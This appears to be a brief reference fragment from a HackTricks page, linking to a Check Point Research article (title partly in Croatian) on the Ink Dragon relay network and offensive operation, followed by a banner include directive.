- [3] [Check Point Research – Unutar Ink Dragon-a: Otkrivanje relay network-a i unutrašnjeg rada stealthy offensive operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)

{{#include ../banners/hacktricks-training.md}}
